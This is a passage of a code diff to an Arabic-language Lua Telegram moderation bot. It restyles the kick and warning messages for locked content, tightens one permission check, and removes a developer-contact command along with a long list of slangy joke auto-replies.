 text:match("[Tt].[Mm][Ee]") or
@@ -1494,7 +1539,7 @@ text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") then
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
 chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الروابط تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الروابط تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
   end
        if database:get('bot:links:warn'..msg.chat_id_) then
      local id = msg.id_
@@ -1502,7 +1547,7 @@ chat_kick(msg.chat_id_, msg.sender_user_id_)
         local chat = msg.chat_id_
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الروابط تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الروابط تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
 	end
  end
 
@@ -1537,7 +1582,7 @@ chat_kick(msg.chat_id_, msg.sender_user_id_)
               end
               if database:get('bot:spam:warn'..msg.chat_id_) and string.len(text) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
                 delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الكلايش تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الكلايش تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
               end
           end 
 
@@ -1565,7 +1610,7 @@ chat_kick(msg.chat_id_, msg.sender_user_id_)
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الدردشه تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الدردشه تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1575,7 +1620,7 @@ chat_kick(msg.chat_id_, msg.sender_user_id_)
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الدردشه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الدردشه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
 if msg.forward_info_ then
@@ -1598,7 +1643,7 @@ if database:get('bot:forward:ban'..msg.chat_id_) then
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
 		                chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>التوجيه تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>التوجيه تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
 	end
    end
 
@@ -1610,7 +1655,7 @@ if database:get('bot:forward:warn'..msg.chat_id_) then
         local chat = msg.chat_id_
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>التوجيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>التوجيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
 	end
    end
 end
@@ -1639,7 +1684,7 @@ elseif msg_type == 'MSG:Text' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>المعرفات <@> تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>المعرفات <@> تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1649,7 +1694,7 @@ elseif msg_type == 'MSG:Text' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>المعرفات <@> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>المعرفات <@> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
  end
@@ -1677,7 +1722,7 @@ elseif msg_type == 'MSG:Text' then
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>التاكات <#> تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>التاكات <#> تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1687,7 +1732,7 @@ elseif msg_type == 'MSG:Text' then
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>التاكات <#> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>التاكات <#> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
 end
@@ -1716,7 +1761,7 @@ end
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الشارحه </> تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الشارحه </> تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
 	end 
 	      if database:get('bot:cmd:warn'..msg.chat_id_) then
      local id = msg.id_
@@ -1724,7 +1769,7 @@ end
         local chat = msg.chat_id_
         local user_id = msg.sender_user_id_
         delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>الشارحه </> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>الشارحه </> تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
 	end 
 	end
    	if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
@@ -1751,7 +1796,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>المواقع تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>المواقع تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1761,7 +1806,7 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>المواقع تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>المواقع تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
  end
@@ -1789,7 +1834,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>اللغه العربيه تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>اللغه العربيه تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1799,7 +1844,7 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>اللغه العربيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>اللغه العربيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
  end
@@ -1827,7 +1872,7 @@ end
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
        chat_kick(msg.chat_id_, msg.sender_user_id_)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>اللغه الانكليزيه تم قفلها ممنوع ارسالها</code> ⚠️\n● - <code>تم طردك</code> ❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>اللغه الانكليزيه تم قفلها ممنوع ارسالها</code> ⚠️\n• <code>تم طردك</code> ❌", 1, 'html')
           return 
    end
    
@@ -1837,503 +1882,15 @@ end
     local chat = msg.chat_id_
     local user_id = msg.sender_user_id_
        delete_msg(chat,msgs)
-          send(msg.chat_id_, 0, 1, "● - <code>الايدي 📍 : </code><i>"..msg.sender_user_id_.."</i>\n● - <code>اللغه الانكليزيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
+          send(msg.chat_id_, 0, 1, "• <code>الايدي 📍 : </code><code>"..msg.sender_user_id_.."</code>\n• <code>اللغه الانكليزيه تم قفلها ممنوع ارسالها</code> ⚠️❌", 1, 'html')
           return 
    end
      end
     end
    end
-  if database:get('bot:cmds'..msg.chat_id_) and not is_mod(msg.sender_user_id_, msg.chat_id_) then
+  if database:get('bot:cmds'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
   return 
 else
-
---[[                                       
-
-هنا تقوم بتغير امر المطور 
-قم بمسح الرقم 9647707641864 ووضع رقمك لكن لا تضعه بغير هذه الطريقه
-مثال : تكتب رقمك 07707641864 لا يجب كذلك 
-يجب عليك وضع 964 في بدايته رقم الهاتف وعدم كتابته الرقم 0 الذي في بدايه الارقام 
-ولا يجب وضع علامه + قبل الرقم 964 يجب عليك تغير الرقم من رقم 7 الى 4 فقط
-بعدها تذهب الى كلمه
-الموجوده داخل "" هذه
-"TshAke TEAM"
-الان نقوم بمسح 
-TshAke TEAM
-ونترك ""
-تكتب اسمك مثال
-"تشاكي"
-وتقوم بحفظ الملف وعمل 
-Run لملف TSHAKE-Auto.sh
-
---]]
-
-if text:match("^[Dd][Ee][Vv]$")or text:match("^مطور بوت$") or text:match("^مطورين$") or text:match("^مطور البوت$") or text:match("^المطورين$") or text:match("^مطور$") or text:match("^المطور$") and msg.reply_to_message_id_ == 0 then
-sendContact(msg.chat_id_, msg.id_, 0, 1, nil, 9647707641864, "TshAke TEAM" , "", bot_id)
-end
-
---[[                                       
-
-رودو البوت
-
---]]
-  
-if text == 'هلو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• هَٰہۧـﮧﮧلْٰاَٰوٍّ໑اَٰتّٰ 🌝☄ֆ"
-else 
-moody = ""
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-
-if text == 'تشاكي' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• نٍٰـعٍِّـﮧﮧمٍٰ تّٰفِٰـہضلْٰ 🍁🌛ֆ"
-else 
-moody = ""
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شلونكم' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• تّٰمٍٰـﮧاَٰمٍٰ وٍّاَٰنٍٰتّٰـہهَٰہۧ 😽⚡️ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شلونك' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰلْٰـحٌٰمٍٰـﮧﮧدِٰاَٰلْٰلْٰهَٰہۧ وٍّ୭اَٰنٍٰتّٰـهَٰہۧ 😼💛ֆ"
-else
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'تمام' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• دِٰوٍّ൭مٍٰ يَٰـﮧﮧاَٰرِٰبٌِٰ 😻🌪ֆ"
-else
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'هلاو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• هَٰہۧـہ୪وٍّ୭اَٰتّٰ حٌٰبٌِٰـﮧيَٰ 🤗🌟ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '😐' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• شَُـبٌِٰيَٰـكٍٰ صُِـﮧﮧاَٰفِٰنٍٰ عٍِّ خّٰاَٰلْٰتّٰـہكٍٰ😹🖤ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'هاي' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• هَٰہۧـاَٰيَٰـﮧﮧاَٰتّٰ يَٰـرِٰوٍّحٌٰـہيَٰ 🙋🏼‍♂💙ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'بوت' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• تّٰفِٰـضـﮧلْٰ حٌٰبٌِٰـہيَٰ 🌚💫ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'اريد اكبل' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• شَُـوٍّ໑فِٰلْٰيَٰ وٍّيَٰـاَٰكٍٰ حٌٰدِٰيَٰـہقٍٰهَٰہۧ وٍّدِٰاَٰيَٰـﮧحٌٰ رِٰسٌٍمٍٰـہيَٰ😾😹💜ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'لتزحف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• دِٰعٍِّـوٍّ໑فِٰهَٰہۧ زًَاَٰحٌٰـﮧفِٰ عٍِّ خّٰاَٰلْٰـتّٰكٍٰ خّٰـلْٰيَٰ يَٰسٌٍـہتّٰفِٰاَٰدِٰ😾🌈ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'كلخرا' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• خّٰـﮧرِٰاَٰ يَٰتّٰـہرِٰسٌٍ حٌٰلْٰكٍٰـﮧكٍٰ يَٰاَٰخّٰـﮧرِٰاَٰاَٰ💩ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'زاحف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• زًَاَٰحٌٰـﮧفِٰ عٍِّ اَٰخّٰتّٰـﮧكٍٰ؟ كٍٰضيَٰـﮧتّٰ عٍِّمٍٰرِٰكٍٰ جًِّرِٰجًِّـﮧفِٰ😾😹ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'دي' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• خّٰلْٰيَٰنٍٰـﮧيَٰ اَٰحٌٰبٌِٰـﮧكٍٰ 😾ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'فرخ' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• وٍّيَٰنٍٰـﮧهَٰہۧ؟ خّٰ اَٰحٌٰضـﮧرِٰهَٰہۧ 😾😹ֆ"
-else
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'تعالي خاص' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰهَٰہۧـﮧوٍّ໑ ضـﮧلْٰ ضـﮧلْٰ سٌٍـﮧاَٰحٌٰفِٰ كٍٰبٌِٰـﮧرِٰ طَُِمٍٰـہكٍٰ😗😂💚ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'اكرهك' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "•دِٰيَٰلْٰـﮧهَٰہۧ شَُـﮧوٍّ୭نٍٰ اَٰطَُِيَٰـقٍٰكٍٰ نٍٰـيَٰ 🙎🏼‍♂🖤ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'احبك' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "•حٌٰبٌِٰيَٰبٌِٰـﮧيَٰ وٍّنٍٰـﮧيَٰ هَٰہۧــمٍٰ😻👅ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'باي' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• وٍّيَٰـﮧنٍٰ رِٰاَٰيَٰـہحٌٰ خّٰلْٰيَٰنٍٰـﮧهَٰہۧ مٍٰتّٰوٍّنٍٰسٌٍيَٰـﮧنٍٰ🙁💔ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'واكف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• بٌِٰنٍٰلْٰخّٰـﮧرِٰاَٰ وٍّيَٰـﮧنٍٰ وٍّاَٰكٍٰـﮧفِٰ😐😒ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'وين المدير' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• لْٰيَٰـﮧشَُ شَُتّٰـﮧرِٰيَٰدِٰ🤔ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'انجب' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• صُِـﮧاَٰرِٰ سٌٍتّٰـﮧاَٰدِٰيَٰ🐸❤️ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'تحبني' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• مٍٰـﮧاَٰدِٰرِٰيَٰ اَٰفِٰكٍٰـﮧرِٰ🙁😹ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🌚' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• فِٰـﮧدِٰيَٰتّٰ صُِخّٰـﮧاَٰمٍٰكٍٰ🙊👄ֆ "
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🙄' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• نٍٰـہزًَلْٰ عٍِّيَٰـنٍٰكٍٰ عٍِّيَٰـﮧبٌِٰ🌚😹ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '😒' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• شَُبٌِٰيَٰـﮧكٍٰ كٍٰاَٰلْٰـﮧبٌِٰ خّٰلْٰقٍٰتّٰـﮧكٍٰ😟🐈ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '😳' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• هَٰہۧـاَٰ بٌِٰسٌٍ لْٰاَٰ شَُفِٰـﮧتّٰ عٍِّمٍٰتّٰـﮧكٍٰ اَٰلْٰعٍِّـﮧوٍّ໑بٌِٰهَٰہۧ😐😹ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🙁' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• تّٰعٍِّـﮧاَٰلْٰ اَٰشَُكٍٰيَٰلْٰـﮧيَٰ هَٰہۧمٍٰوٍّمٍٰـﮧكٍٰ لْٰيَٰـشَُ • ضاَٰيَٰـﮧجًِّ🙁💔ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🚶💔' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• تّٰعٍِّـﮧاَٰلْٰ اَٰشَُكٍٰيَٰلْٰـﮧيَٰ هَٰہۧمٍٰوٍّمٍٰـﮧكٍٰ لْٰيَٰـشَُ • ضاَٰيَٰـﮧجًِّ🙁💔ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🙂' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• ثِْْكٍٰيَٰـﮧلْٰ نٍٰهَٰہۧنٍٰهَٰہۧنٍٰهَٰہۧنٍٰهَٰہۧ🐛ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '🌝' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• مٍٰنٍٰـﮧوٍّ໑رِٰ حٌٰبٌِٰـعٍِّمٍٰـہرِٰيَٰ😽💚ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'صباحو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• صُِبٌِٰاَٰحٌٰـہكٍٰ عٍِّسٌٍـہلْٰ يَٰعٍِّسٌٍـﮧلْٰ😼🤞ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'صباح الخير' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• صُِبٌِٰاَٰحٌٰـہكٍٰ عٍِّسٌٍـہلْٰ يَٰعٍِّسٌٍـﮧلْٰ😼🤞ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'كفو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰهَٰہۧ كٍٰفِٰـﮧوٍّ໑ يَٰبٌِٰہوٍّ୭ اَٰلْٰضـلْٰہوٍّ୭عٍِّ🙀😹ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '😌' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰلْٰمٍٰطَُِلْٰـﮧوٍّ໑بٌِٰ !😕💞ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'اها' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• يَٰبٌِٰ قٍٰاَٰبٌِٰـﮧلْٰ اَٰغِِٰشَُـﮧكٍٰ شَُسٌٍاَٰلْٰفِٰـﮧهَٰہۧ حٌٰبٌِٰ😐🌝ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شسمج' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰسٌٍـمٍٰهَٰہۧـﮧاَٰ جًِّعٍِّجًِّـﮧوٍّ໑عٍِّهَٰہۧ😹👊ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شسمك' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰسٌٍمٍٰـﮧهَٰہۧ عٍِّبٌِٰـﮧوٍّ໑سٌٍيَٰ لْٰـوٍّ૭سٌٍہيَٰ😾😹💛ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شوف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• شَُشَُـﮧﮧوٍّ໑فِٰ 🌝🌝ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'مساء الخير' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• مٍٰسٌٍـﮧاَٰء اَٰلْٰحٌٰـﮧبٌِٰ يَٰحٌٰہبٌِٰحٌٰہبٌِٰ🌛🔥ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'المدرسه' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• لْٰتّٰجًِّيَٰـﮧبٌِٰ اَٰسٌٍمٍٰـﮧهَٰہۧ لْٰاَٰ اَٰطَُِـﮧرِٰدِٰكٍٰ🌞✨ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'منو ديحذف رسائلي' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• خّٰـﮧاَٰلْٰتّٰـہكٍٰ 🌚ֆ🌝"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'البوت واكف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• لْٰجًِّـﮧذَْبٌِٰ حٌٰبٌِٰـہيَٰ 🌞⚡️ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'غلس' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• وٍّ໑كٍٰ بٌِٰـﮧسٌٍ سٌٍـﮧوٍّ୭لْٰفِٰلْٰيَٰ اَٰلْٰسٌٍـﮧاَٰلْٰفِٰهَٰہۧ بٌِٰعٍِّـﮧدِٰيَٰنٍٰ🌝🦅ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'حارة' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
